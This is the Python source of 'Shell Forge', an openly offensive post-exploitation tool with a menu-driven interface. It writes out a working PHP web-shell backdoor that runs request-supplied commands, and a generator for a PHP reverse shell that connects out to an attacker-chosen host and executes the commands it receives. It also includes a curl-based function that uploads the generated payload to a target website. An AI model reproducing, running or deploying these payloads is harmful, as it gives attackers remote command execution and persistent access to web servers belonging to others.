import colorama
import subprocess
from tabulate import tabulate
import PostExploitation

colorama.init(autoreset=True)

backdoor_payload = """
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
} else {
    echo "No command provided.";
}
?>
"""

def generate_reverseShell(LHOST, LPORT=4444):
    reverseShell_payload = ''
    reverseShell_payload+= '<?php\n'
    reverseShell_payload+= f'$ip = "{LHOST}";\n'
    reverseShell_payload+= f'$port = {LPORT};\n'
    reverseShell_payload+= '$sock = fsockopen($ip, $port);\n'
    reverseShell_payload+= 'if (!$sock) {\n'
    reverseShell_payload+= '   die("Connection failed.\\n");\n'
    reverseShell_payload+= '}\n'
    reverseShell_payload+= 'while ($cmd = fgets($sock, 1024)) {\n'
    reverseShell_payload+= '    $output = shell_exec($cmd);\n'
    reverseShell_payload+= '    fwrite($sock, $output);\n'
    reverseShell_payload+= '}\n'
    reverseShell_payload+= '?>'
    return reverseShell_payload

options = {
    'PAYLOAD': 'php/reverse_tcp',
    'LHOST': '192.168.1.10',
    'LPORT': '4444',
    'TARGET': 'example.com'
}

def print_banner():
    banner = """
  _________.__           .__  .__    ___________                         
 /   _____/|  |__   ____ |  | |  |   \\_   _____/__________  ____   ____  
 \\_____  \\ |  |  \\_/ __ \\|  | |  |    |    __)/  _ \\_  __ \\/ ___\\_/ __ \\ 
 /        \\|   Y  \\  ___/|  |_|  |__  |     \\(  <_> )  | \\/ /_/  >  ___/ 
/_______  /|___|  /\\___  >____/____/  \\___  / \\____/|__|  \\___  / \\___  >
        \\/      \\/     \\/                 \\/             /_____/      \\/ 
    Author: UnexpectedRandom
    Version: 1.0
    Shell Forge - A Powerful Post-Exploitation Tool

    Type 'help' to view available commands.
    """
    print(colorama.Fore.GREEN + banner)

def options_menu():
    print("""
    ============================
           Shell Forge
    ============================
    [1] - Generate Payload
    [2] - Use Post Exploitation
    [3] - Upload Payload To Website
    [4] - Exit
    ============================\n""")

def payload_options():
    print("""
    =========================
        Payload Generator
    =========================
    [1] - php/backdoor
    [2] - php/reverse_tcp
    [3] - Exit

    Warning: Recommended to generate a backdoor when you have full access to the server.
    """)

def print_payload_settings():
    options_data = [
        ["PAYLOAD", options['PAYLOAD'], "yes", "The type of payload to generate"],
        ["LHOST", options['LHOST'], "yes", "The local IP address to receive the connection"],
        ["LPORT", options['LPORT'], "no", "The local port to listen on"],
        ["TARGET", options['TARGET'], "no", "The remote target server"]
    ]
    headers = ["Name", "Current Setting", "Required", "Description"]
    print("\nModule options (post/php/shellforge):\n")
    print(tabulate(options_data, headers=headers, tablefmt="plain"))
    print()

def upload_payload():
    target = options['TARGET']
    file = input("Enter payload file name to upload: ").strip()
    try:
        subprocess.run(['curl', '-T', file, f"{target}/{file}"], check=True)
        print(f"Uploaded {file} to {target}")
    except subprocess.CalledProcessError:
        print("Upload failed.")

def print_help():
    help_text = """
    Shell Forge Help Menu:
    ============================
    [1] - Generate Payload:
        Generates various types of payloads, including backdoors and reverse shells.
    [2] - Post Exploitation:
        Use post-exploitation tools for further interaction with the compromised system.
    [3] - Upload Payload:
        Upload a generated payload to a target server.
    [4] - Exit:
        Exit the application.

    Commands for Payload Generation:
    --------------------------------
    - Backdoor Generator: Generate a PHP backdoor payload.
    - Reverse Shell Payload: Generate a reverse shell payload for remote access.

    Type 'help' to view this menu again.
    """

    print(help_text)

def main():
    print_banner()
    while True:
        command = input("?> ").strip()

        if command == 'help':
            print_help()

        elif command == '1':
            payload_options()
            print("Do: Show options to show your options\nDo: generate to generate a payload\nDo: show all to show every options and other things\n")
            while True:
                payload_command = input('?payload> ').strip()

                if payload_command.lower() == 'exit':
                    break

                elif payload_command.lower() == 'show options':
                    print_payload_settings()

                elif payload_command.lower().startswith('set lhost'):
                    options['LHOST'] = payload_command[9:].strip()

                elif payload_command.lower().startswith('set lport'):
                    options['LPORT'] = payload_command[9:].strip()

                elif payload_command.lower().startswith('set payload'):
                    options['PAYLOAD'] = payload_command[11:].strip()

                elif payload_command.lower().startswith('set target'):
                    options['TARGET'] = payload_command[10:].strip()

                elif payload_command.lower() == 'show all':
                    for key, value in options.items():
                        print(f"{key}: {value}")

                elif payload_command.lower() == 'generate':
                    if options['PAYLOAD'] == 'php/reverse_tcp':
                        fileName = 'reverse_shell.php'
                        with open(fileName, 'w+') as f:
                            f.write(generate_reverseShell(options['LHOST'], options['LPORT']))
                        print(f'Generated {fileName}')

                    elif options['PAYLOAD'] == 'php/backdoor':
                        fileName = 'simple_backdoor.php'
                        with open(fileName, 'w+') as f:
                            f.write(backdoor_payload)
                        print(f'Generated {fileName}')                  

        elif command == '2':
            PostExploitation.run()

        elif command == '3':
            upload_payload()

        elif command == '4':
            break

main()
print("[=] Thank you for using ShellForge - By Mohammad")
